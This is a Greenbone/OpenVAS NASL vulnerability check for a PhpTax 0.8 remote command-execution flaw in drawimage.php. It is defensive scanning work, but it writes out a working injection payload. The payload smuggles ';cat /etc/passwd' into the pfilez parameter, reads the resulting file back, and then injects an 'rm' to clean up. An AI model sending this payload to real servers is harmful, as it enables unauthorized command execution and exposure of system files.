if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103582" );
	script_bugtraq_id( 55759 );
	script_tag( name: "cvss_base", value: "9.7" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:C" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "PhpTax 'drawimage.php' Remote Arbitrary Command Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/55759" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-10-09 14:42:33 +0200 (Tue, 09 Oct 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "PhpTax is prone to a remote arbitrary command-execution vulnerability
  because it fails to properly validate user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to execute arbitrary commands
  within the context of the vulnerable application." );
	script_tag( name: "affected", value: "PhpTax 0.8 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/phptax", "/tax", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/index.php", port: port );
	if(ContainsString( buf, "<title>PHPTAX" )){
		vtstrings = get_vt_strings();
		file = vtstrings["lowercase_rand"] + ".txt";
		ex = "xx%3bcat+%2Fetc%2Fpasswd+%3E+.%2F" + file + "%3b";
		url = dir + "/drawimage.php?pdf=make&pfilez=" + ex;
		if(http_vuln_check( port: port, url: url, pattern: "image/png", check_header: TRUE )){
			url = dir + "/" + file;
			if(http_vuln_check( port: port, url: url, pattern: "root:.*:0:[01]:", check_header: TRUE )){
				url = dir + "/drawimage.php?pdf=make&pfilez=%3Brm+.%2F" + file + "%3B";
				http_vuln_check( port: port, url: url, pattern: "none" );
				security_message( port: port );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

